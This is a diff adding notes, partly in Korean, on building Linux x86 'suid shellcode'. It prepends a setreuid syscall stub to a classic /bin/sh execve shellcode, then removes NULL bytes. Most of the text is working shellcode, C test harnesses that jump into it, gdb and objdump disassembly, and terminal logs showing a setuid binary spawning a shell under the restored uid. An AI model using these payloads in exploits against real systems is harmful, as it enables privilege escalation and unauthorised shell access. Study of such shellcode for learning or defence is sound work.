@@ -1,0 +1,318 @@
+/*
+* make the suid shellcode
+*/
+
+------------------------------------------ [ original shellcode ]
+
+/*
+* [indra@naggo shellcode]$ more egg.c
+* char shellcode[] =
+*         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+*         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+*         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+* main() 
+* {
+*         int *ret;
+*         ret = (int *)&ret + 2;
+*         (*ret) = (int)shellcode;
+* }
+* [indra@naggo shellcode]$ ./egg
+* sh-2.05a$ id
+* uid=523(indra) gid=523(indra) groups=523(indra)
+* sh-2.05a$ 
+*/
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+main() 
+{
+        int *ret;
+        ret = (int *)&ret + 2;
+        (*ret) = (int)shellcode;
+}
+
+-----------------------------------------------------------------
+
+------------------------------------------- [ setreuid.c source ]
+
+/* 
+* setreuid.c
+*/
+
+#include <unistd.h>
+
+main()
+{
+	setreuid(523,523);
+}
+
+-----------------------------------------------------------------
+
+-------------------------------------- [ setreuid.c disassemble ]
+
+(gdb) disas main
+Dump of assembler code for function main:
+0x80481e0 <main>:       push   %ebp
+0x80481e1 <main+1>:     mov    %esp,%ebp
+0x80481e3 <main+3>:     push   $0x20b
+0x80481e8 <main+8>:     push   $0x20b
+0x80481ed <main+13>:    call   0x804cf70 <setreuid>
+0x80481f2 <main+18>:    add    $0x8,%esp
+0x80481f5 <main+21>:    leave  
+0x80481f6 <main+22>:    ret    
+0x80481f7 <main+23>:    nop    
+End of assembler dump.
+(gdb) disas setreuid
+Dump of assembler code for function setreuid:
+0x804cf70 <setreuid>:   push   %ebp
+0x804cf71 <setreuid+1>: mov    0x80a0d8c,%eax
+0x804cf76 <setreuid+6>: mov    %esp,%ebp
+0x804cf78 <setreuid+8>: test   %eax,%eax
+0x804cf7a <setreuid+10>:        push   %esi
+0x804cf7b <setreuid+11>:        push   %ebx
+0x804cf7c <setreuid+12>:        jle    0x804cfd8 <setreuid+104>
+0x804cf7e <setreuid+14>:        mov    0x8(%ebp),%eax
+0x804cf81 <setreuid+17>:        inc    %eax
+0x804cf82 <setreuid+18>:        cmp    $0xffff,%eax
+0x804cf87 <setreuid+23>:        ja     0x804cf94 <setreuid+36>
+0x804cf89 <setreuid+25>:        mov    0xc(%ebp),%eax
+0x804cf8c <setreuid+28>:        inc    %eax
+0x804cf8d <setreuid+29>:        cmp    $0xffff,%eax
+0x804cf92 <setreuid+34>:        jbe    0x804cfa8 <setreuid+56>
+0x804cf94 <setreuid+36>:        call   0x8048484 <__errno_location>
+0x804cf99 <setreuid+41>:        movl   $0x16,(%eax)
+0x804cf9f <setreuid+47>:        mov    $0xffffffff,%eax
+0x804cfa4 <setreuid+52>:        pop    %ebx
+0x804cfa5 <setreuid+53>:        pop    %esi
+0x804cfa6 <setreuid+54>:        pop    %ebp
+0x804cfa7 <setreuid+55>:        ret    
+0x804cfa8 <setreuid+56>:        mov    0x8(%ebp),%eax
+0x804cfab <setreuid+59>:        mov    0xc(%ebp),%ecx
+0x804cfae <setreuid+62>:        push   %ebx
+0x804cfaf <setreuid+63>:        mov    %eax,%ebx
+0x804cfb1 <setreuid+65>:        mov    $0x46,%eax
+0x804cfb6 <setreuid+70>:        int    $0x80
+0x804cfb8 <setreuid+72>:        pop    %ebx
+0x804cfb9 <setreuid+73>:        mov    %eax,%ebx
+0x804cfbb <setreuid+75>:        cmp    $0xfffff000,%ebx
+0x804cfc1 <setreuid+81>:        jbe    0x804cfd1 <setreuid+97>
+0x804cfc3 <setreuid+83>:        neg    %ebx
+0x804cfc5 <setreuid+85>:        call   0x8048484 <__errno_location>
+0x804cfca <setreuid+90>:        mov    %ebx,(%eax)
+0x804cfcc <setreuid+92>:        mov    $0xffffffff,%ebx
+0x804cfd1 <setreuid+97>:        mov    %ebx,%eax
+0x804cfd3 <setreuid+99>:        jmp    0x804cfa4 <setreuid+52>
+0x804cfd5 <setreuid+101>:       lea    0x0(%esi),%esi
+0x804cfd8 <setreuid+104>:       call   0x8048484 <__errno_location>
+0x804cfdd <setreuid+109>:       mov    %eax,%esi
+0x804cfdf <setreuid+111>:       mov    (%esi),%ebx
+0x804cfe1 <setreuid+113>:       mov    0x8(%ebp),%edx
+0x804cfe4 <setreuid+116>:       mov    0xc(%ebp),%ecx
+0x804cfe7 <setreuid+119>:       xchg   %edx,%ebx
+0x804cfe9 <setreuid+121>:       mov    $0xcb,%eax
+0x804cfee <setreuid+126>:       int    $0x80                     <-- (real excuting)
+0x804cff0 <setreuid+128>:       xchg   %edx,%ebx
+0x804cff2 <setreuid+130>:       cmp    $0xfffff000,%eax
+0x804cff7 <setreuid+135>:       jbe    0x804d002 <setreuid+146>
+0x804cff9 <setreuid+137>:       neg    %eax
+0x804cffb <setreuid+139>:       mov    %eax,(%esi)
+0x804cffd <setreuid+141>:       mov    $0xffffffff,%eax
+0x804d002 <setreuid+146>:       test   %eax,%eax
+0x804d004 <setreuid+148>:       je     0x804cfa4 <setreuid+52>
+0x804d006 <setreuid+150>:       cmpl   $0x26,(%esi)
+0x804d009 <setreuid+153>:       jne    0x804cfa4 <setreuid+52>
+0x804d00b <setreuid+155>:       mov    %ebx,(%esi)
+0x804d00d <setreuid+157>:       movl   $0x1,0x80a0d8c
+0x804d017 <setreuid+167>:       jmp    0x804cf7e <setreuid+14>
+End of assembler dump.
+
+-----------------------------------------------------------------
+
+--------------------------------------------------------- [ 1.s ]
+
+/* 
+* 1.s
+*/
+
+.globl main
+
+main:
+	movl	$0x20b, %ecx
+	movl	$0x20b, %ebx
+	movl	$0xcb, 	%eax
+	int	$0x80
+	ret
+
+-----------------------------------------------------------------
+
+----------------------------------- [ dump result of 1.s binary ]
+
+.....
+
+080483d0 <main>:
+ 80483d0:       b9 0b 02 00 00          mov    $0x20b,%ecx
+ 80483d5:       bb 0b 02 00 00          mov    $0x20b,%ebx
+ 80483da:       b8 cb 00 00 00          mov    $0xcb,%eax
+ 80483df:       cd 80                   int    $0x80
+ 80483e1:       c3                      ret    
+
+.....
+
+-----------------------------------------------------------------
+
+-------------------------------------- [ extracted code (first) ]
+
+"\xb9\x0b\x02\x00\x00\xbb\x0b\x02\x00\x00"
+"\xb8\xcb\x00\x00\x00\xcd\x80"
+
+-----------------------------------------------------------------
+
+---------------------------------------------------- [ suid-1.c ]
+
+/* 
+* [indra@naggo shellcode]$ cat > test.c
+* char shellcode[] =
+*         "\xb9\x0b\x02\x00\x00"  /* mov    $0x20b,%ecx */
+*         "\xbb\x0b\x02\x00\x00"  /* mov    $0x20b,%ebx */
+*         "\xb8\xcb\x00\x00\x00"  /* mov    $0xcb,%eax */
+*         "\xcd\x80"              /* int    $0x80 */
+*         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+*         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+*         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+* main() 
+* {
+*         int *ret;
+*         ret = (int *)&ret + 2;
+*         (*ret) = (int)shellcode;
+* }
+* [indra@naggo shellcode]$ cc -o test test.c
+* [indra@naggo shellcode]$ chmod +s test 
+* [indra@naggo shellcode]$ ../bin/suid 
+* [apache@naggo shellcode]$ id
+* uid=48(apache) gid=523(indra) groups=523(indra)
+* [apache@naggo shellcode]$ ./test
+* sh-2.05a$ id
+* uid=523(indra) gid=523(indra) groups=523(indra)
+* sh-2.05a$ 
+*/
+
+char shellcode[] =
+	"\xb9\x0b\x02\x00\x00"	/* mov    $0x20b,%ecx */
+	"\xbb\x0b\x02\x00\x00"	/* mov    $0x20b,%ebx */
+	"\xb8\xcb\x00\x00\x00"	/* mov    $0xcb,%eax */
+	"\xcd\x80"		/* int    $0x80	*/
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+main() 
+{
+        int *ret;
+        ret = (int *)&ret + 2;
+        (*ret) = (int)shellcode;
+}
+
+-----------------------------------------------------------------
+
+--------------------- NULL 바이트 루틴 제거 ---------------------
+
+null 제거시에 인지할 사항:
+
+1. movl = 4byte (0xffffffff) => %eax
+2. movw = 2byte (0xffff) => %ax
+3. movb = 1byte	(0xff) => %al
+
+--------------------------------------------------------- [ 2.s ]
+
+/* 
+* 2.s
+*/
+
+.globl main
+
+main:
+	xor	%ecx, %ecx
+	movw	$0x20b, %cx
+	xor	%ebx, %ebx
+	movw	$0x20b, %bx
+	xor	%eax, %eax
+	movb	$0xcb, 	%al
+	int	$0x80
+	ret
+
+-----------------------------------------------------------------
+
+----------------------------------- [ dump result of 2.s binary ]
+
+.....
+
+080483d0 <main>:
+ 80483d0:       31 c9                   xor    %ecx,%ecx
+ 80483d2:       66 b9 0b 02             mov    $0x20b,%cx
+ 80483d6:       31 db                   xor    %ebx,%ebx
+ 80483d8:       66 bb 0b 02             mov    $0x20b,%bx
+ 80483dc:       31 c0                   xor    %eax,%eax
+ 80483de:       b0 cb                   mov    $0xcb,%al
+ 80483e0:       cd 80                   int    $0x80
+
+.....
+
+-----------------------------------------------------------------
+
+------------------------------------- [ extracted code (second) ]
+
+"\x31\xc9\x66\xb9\x0b\x02\x31\xdb"
+"\x66\xbb\x0b\x02\x31\xc0\xb0\xcb\xcd\x80"
+
+-----------------------------------------------------------------
+
+---------------------------------------------------- [ suid-2.c ]
+
+/* 
+* [indra@naggo shellcode]$ cat > test.c
+* char shellcode[] =
+*         "\x31\xc9"              /* xor    %ecx,%ecx */
+*         "\x66\xb9\x0b\x02"      /* mov    $0x20b,%cx */
+*         "\x31\xdb"              /* xor    %ebx,%ebx */
+*         "\x66\xbb\x0b\x02"      /* mov    $0x20b,%bx */
+*         "\x31\xc0"              /* xor    %eax,%eax */
+*         "\xb0\xcb"              /* mov    $0xcb,%al */
+*         "\xcd\x80"              /* int    $0x80 */
+*         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+*         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+*         "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+* main() 
+* {
+*         int *ret;
+*         ret = (int *)&ret + 2;
+*         (*ret) = (int)shellcode;
+* }
+* [indra@naggo shellcode]$ cc -o test test.c
+* [indra@naggo shellcode]$ chmod +s test 
+* [indra@naggo shellcode]$ ../bin/suid 
+* [apache@naggo shellcode]$ id
+* uid=48(apache) gid=523(indra) groups=523(indra)
+* [apache@naggo shellcode]$ ./test
+* sh-2.05a$ id
+* uid=523(indra) gid=523(indra) groups=523(indra)
+* sh-2.05a$ 
+*/
+
+char shellcode[] =
+	"\x31\xc9"		/* xor    %ecx,%ecx */
+	"\x66\xb9\x0b\x02"	/* mov    $0x20b,%cx */
+	"\x31\xdb"		/* xor    %ebx,%ebx */
+	"\x66\xbb\x0b\x02"	/* mov    $0x20b,%bx */
+	"\x31\xc0"		/* xor    %eax,%eax */
+	"\xb0\xcb"		/* mov    $0xcb,%al */
+	"\xcd\x80"		/* int    $0x80 */
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+main() 
+{
+        int *ret;
+        ret = (int *)&ret + 2;
+        (*ret) = (int)shellcode;
+}
